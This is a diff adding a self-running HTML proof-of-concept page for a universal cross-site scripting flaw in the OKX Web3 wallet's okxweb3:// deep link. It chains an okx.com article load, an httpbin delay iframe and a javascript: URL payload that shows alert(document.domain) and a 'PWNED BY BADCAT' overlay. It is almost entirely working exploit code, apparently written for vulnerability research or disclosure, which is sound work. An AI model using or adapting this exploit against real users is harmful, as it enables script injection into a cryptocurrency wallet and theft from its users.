@@ -1,0 +1,42 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>OKX SearchEntry UXSS</title>
+<style>
+  body{font:22px/1.45 system-ui,sans-serif;padding:24px;background:#f6f7fb;color:#111}
+  button{font:inherit;padding:14px 20px;border:0;border-radius:12px;background:#111;color:#fff}
+  pre{white-space:pre-wrap}
+  iframe{width:1px;height:1px;border:0;position:fixed;left:-10px;top:-10px}
+</style>
+
+<button id="run">wait...</button>
+<pre id="log"></pre>
+<script>
+const first = 'okxweb3://app/support/article?url=' + encodeURIComponent('https://www.okx.com/');
+const payload = `javascript:(()=>{let s=document.createElement('style');s.textContent='@keyframes X{to{transform:translateX(calc(100vw - 120px))}}@keyframes Y{to{transform:translateY(calc(100vh - 90px))}}#T{position:fixed;left:0;top:0;z-index:2147483647;pointer-events:none;animation:X 3s linear infinite alternate}#T b{display:block;font:900 44px system-ui;color:#ff2d55;background:#ffffffe6;padding:8px 18px;border-radius:16px;box-shadow:0 8px 28px #0006;animation:Y 2s linear infinite alternate}';document.head.append(s);let d=document.createElement('div');d.id='T';d.innerHTML='<b>PWNED BY BADCAT</b>';alert(document.domain);document.body.append(d)})()`;
+const second = 'okxweb3://app/support/article?url=' + encodeURIComponent(payload);
+const log = s => document.querySelector('#log').textContent += `${new Date().toISOString()} ${s}\n`;
+let started = false;
+
+function run(){
+  if(started) return;
+  started = true;
+
+  const delayFrame = document.createElement('iframe');
+  delayFrame.onload = () => {
+    log('httpbin delay completed; launching overlay re-entry');
+    location.href = second;
+  };
+  delayFrame.onerror = () => log('httpbin delay frame failed');
+  delayFrame.src = `https://httpbin.org/delay/3?n=${Date.now()}`;
+  document.body.append(delayFrame);
+  log('started httpbin delayed request');
+
+  requestAnimationFrame(() => requestAnimationFrame(() => {
+    log('opening google.com');
+    location.href = first;
+  }));
+}
+
+document.querySelector('#run').onclick = run;
+setTimeout(run, 800);
+</script>
